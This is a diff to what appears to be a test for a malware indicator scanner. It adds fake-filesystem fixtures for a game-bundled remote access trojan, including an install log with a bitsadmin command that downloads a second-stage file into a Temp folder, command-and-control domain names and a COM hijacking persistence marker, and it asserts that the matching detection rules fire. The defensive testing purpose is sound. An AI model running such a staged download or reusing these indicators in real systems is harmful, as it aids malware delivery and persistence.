@@ -182,6 +182,15 @@ function run() {
     "176.120.22.127",
     "2gkRUQNkJyaGkvuDziSq1RGIrwl_4bGyJtv6ez2Hk8Hrd5zvq"
   ].join("\n"));
+  write(path.join(root, "Users", "alice", "Downloads", "visual-novel", "natives2_blob.bin"), "encrypted payload placeholder");
+  write(path.join(root, "Users", "alice", "Downloads", "visual-novel", "zaesdl.dat"), "second stage placeholder");
+  write(path.join(root, "Users", "alice", "Downloads", "visual-novel", "install-log.txt"), [
+    "Argamal loader started after game launch",
+    "bitsadmin.exe /transfer updateJob https://github.example.invalid/zaesdl.dat C:\\Users\\alice\\AppData\\Local\\Temp\\zaesdl.dat",
+    "UDP heartbeat to asper1.freeddns.org and Winst0.kozow.com",
+    "Windows Color System Calibration Loader COM hijacking persistence",
+    "Sandboxie Procmon64 PowerShell natives2_blob.bin",
+  ].join("\n"));
   write(path.join(root, "usr", "share", "man9", "ph", ".ph.man"), "captured ssh credential log placeholder\n");
   write(path.join(root, "lib", "systemd", "system", "chrom.service"), [
     "[Service]",
@@ -317,6 +326,11 @@ function run() {
   assert(ids.has("gentlemen-self-propagation-marker"));
   assert(ids.has("gentlemen-defense-evasion-command-marker"));
   assert(ids.has("gentlemen-network-indicator"));
+  assert(ids.has("argamal-game-rat-file-name"));
+  assert(ids.has("argamal-game-rat-network-indicator"));
+  assert(ids.has("argamal-game-rat-bitsadmin-stage"));
+  assert(ids.has("argamal-game-rat-com-hijack-marker"));
+  assert(ids.has("argamal-game-rat-anti-analysis-marker"));
   assert(ids.has("operation-highland-ioc-path"));
   assert(ids.has("operation-highland-tool-filename"));
   assert(ids.has("operation-highland-network-indicator"));
